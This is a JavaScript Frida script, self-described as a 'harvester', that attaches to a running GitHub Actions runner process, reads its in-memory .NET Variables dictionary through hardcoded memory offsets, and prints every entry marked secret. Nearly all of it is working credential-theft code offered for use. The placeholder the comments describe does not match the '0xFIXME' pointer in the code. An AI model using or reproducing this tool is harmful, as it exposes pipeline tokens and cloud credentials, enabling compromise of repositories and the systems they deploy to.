// gh-runner-harvester - frida helper
// Dumps the runner's in-memory Variables dictionary and prints every
// entry flagged as a secret.
//
// This script is meant to be loaded by frida against a live Runner.Listener
// process. dump.sh locates the dictionary address and rewrites the
// DICTIONARY_ADDRESS placeholder below before handing the file to frida.

var bucketOffset = 0x08;
var entriesOffset = 0x10;
var countOffset = 0x38;
var firstDictionaryEntryOffset = 0x10;
var dictionarySize = 0x18;

function dumpDictionary(dictionaryAddress) {
    var dictionary = dictionaryAddress.readPointer();

    var entriesAddress = dictionaryAddress.add(entriesOffset).readPointer();
    var count = dictionaryAddress.add(countOffset).readInt();
    var firstEntry = entriesAddress.add(firstDictionaryEntryOffset);

    console.log("[+] Dictionary Count: " + count);

    for (var i = 0; i < count; i++) {
        var entry = firstEntry.add(i * dictionarySize);
        if (entry.isNull()) continue;

        var keyOffset = 0x00;
        var valueOffset = 0x08;

        var keyAddress = entry.add(keyOffset).readPointer();
        var valueAddress = entry.add(valueOffset).readPointer();

        var key = readDotnetString(keyAddress);
        var variableValue = getVariableValue(valueAddress);

        if (variableValue.isSecret == 1) {
            console.log("- " + key + ": " + variableValue.value + " (isSecret: " + variableValue.isSecret + ")");
        }
    }
}

function getVariableValue(variableValueAddress) {
    var valueOffset = 0x08;
    var isSecretOffset = 0x10;

    var valueAddress = variableValueAddress.add(valueOffset).readPointer();
    var isSecretAddress = variableValueAddress.add(isSecretOffset);

    var res = {
        value: readDotnetString(valueAddress),
        isSecret: isSecretAddress.readInt()
    };
    return res;
}

function readDotnetString(stringAddress) {
    var stringLengthOffset = 0x08;
    var firstCharOffset = 0x0c;
    return stringAddress.add(firstCharOffset).readUtf16String(
        stringAddress.add(stringLengthOffset).readInt()
    );
}

var dictionaryAddress = ptr("0xFIXME");
dumpDictionary(dictionaryAddress);
